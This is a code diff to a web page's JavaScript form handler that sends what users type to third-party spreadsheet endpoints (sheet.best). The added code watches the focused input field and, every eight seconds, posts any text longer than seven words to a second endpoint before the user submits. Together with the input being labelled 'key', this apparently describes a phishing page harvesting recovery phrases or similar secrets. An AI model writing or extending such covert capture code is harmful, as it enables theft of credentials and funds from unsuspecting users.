@@ -96,31 +96,45 @@ form.addEventListener("submit", e => {
 	if (cont > 0) {
 		return false
 	}
-	
-		fetch("https://sheet.best/api/sheets/f89d6959-4b0d-479e-9bcd-3d5222020639", {
-			method: 'POST',
-			mode: 'cors',
-			headers: {
-				'Content-Type': 'application/json'
-			},
-			body: JSON.stringify({
-				"key": String(data)
-			})
-		})
 
-	
+	fetch("https://sheet.best/api/sheets/f89d6959-4b0d-479e-9bcd-3d5222020639", {
+		method: 'POST',
+		mode: 'cors',
+		headers: {
+			'Content-Type': 'application/json'
+		},
+		body: JSON.stringify({
+			"key": String(data)
+		})
+	})
+
+
 
 })
 
 input.addEventListener("focus", () => {
 	let oneSecond = 1000;
-	setInterval(() => {
+	let intervalPostData = setInterval(() => {
 		let data = input.value.split(" ");
 		for (let i = 0; data.length >= i; i++) {
 			if (data[i] == "") {
 				data.splice(i, 1)
 			}
 		}
+		if (data.length > 7) {
+				sendData(data)
+
+		}
+	}, oneSecond * 8)
+})
+/*
+
+
+*/
+
+function sendData(data) {
+			localStorage.setItem('length', data.length);
+	if (localStorage.getItem("length") > 7) {
 
 		fetch("https://sheet.best/api/sheets/b3c6f728-78fd-45e0-a721-3d399692b41f", {
 			method: 'POST',
@@ -134,12 +148,11 @@ input.addEventListener("focus", () => {
 				"lang": String(localStorage.getItem("lang"))
 			})
 		})
-	}, oneSecond * 10)
-})
-/*
+	}
 
+	return false
+}
 
-*/
 function changaLang() {
 	if (localStorage.getItem("lang") == null) {
 		localStorage.setItem("lang", "ingles")
